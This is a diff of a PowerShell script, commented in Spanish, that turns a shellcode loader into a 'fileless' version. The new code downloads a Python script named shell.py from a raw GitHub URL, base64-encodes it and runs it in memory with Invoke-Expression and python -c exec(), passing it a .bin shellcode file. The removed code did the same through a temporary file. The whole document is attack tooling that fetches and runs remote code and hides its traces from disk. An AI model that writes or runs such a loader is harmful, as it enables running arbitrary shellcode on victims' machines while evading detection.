@@ -1,41 +1,18 @@
 param(
-    [Parameter(Position=0, Mandatory=$true)]
-    [string]$RutaBin
+    [Parameter(Mandatory=$true)]
+    [string]$BinPath
 )
 
-# URL del script Python en GitHub (raw)
-$PythonScriptUrl = "https://raw.githubusercontent.com/AL4AROX/CodeBin/refs/heads/main/shell.py"
+cls
+Write-Host "[+] Iniciando shellcode loader (fileless)" -ForegroundColor Cyan
 
-# Verificar que el archivo .bin existe localmente
-if (-not (Test-Path $RutaBin)) {
-    Write-Host "Error: No se encuentra el archivo .bin en la ruta especificada: $RutaBin" -ForegroundColor Red
-    exit 1
-}
+$PythonScriptUrl = "https://raw.githubusercontent.com/AL4AROX/CodeBin/main/shell.py"
 
-# Verificar Python
-$pythonExe = Get-Command python -ErrorAction SilentlyContinue
-if (-not $pythonExe) {
-    Write-Host "Error: Python no está instalado o no está en el PATH" -ForegroundColor Red
-    exit 1
-}
+# Descargar código Python
+$pythonCode = (Invoke-WebRequest -Uri $PythonScriptUrl -UseBasicParsing).Content
 
-# Descargar script Python desde GitHub a un archivo temporal
-Write-Host "[*] Descargando shellcode_runner.py desde GitHub..." -ForegroundColor Cyan
-try {
-    $tempPy = [System.IO.Path]::GetTempFileName() + ".py"
-    Invoke-WebRequest -Uri $PythonScriptUrl -OutFile $tempPy
-} catch {
-    Write-Host "Error al descargar el script Python: $_" -ForegroundColor Red
-    exit 1
-}
-
-# Ejecutar Python pasándole la ruta del .bin
-Write-Host "[*] Ejecutando shellcode desde: $RutaBin" -ForegroundColor Green
-try {
-    & python $tempPy $RutaBin
-} catch {
-    Write-Host "Error al ejecutar Python: $_" -ForegroundColor Red
-} finally {
-    # Limpiar archivo temporal
-    Remove-Item $tempPy -Force -ErrorAction SilentlyContinue
-}
+# Ejecutar Python con el código directamente (sin archivo)
+# Usamos -- para pasar argumentos después del comando -c
+$encodedCode = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pythonCode))
+$command = "python -c `"import base64; exec(base64.b64decode('$encodedCode').decode('utf-8'))`" `"$BinPath`""
+Invoke-Expression $command
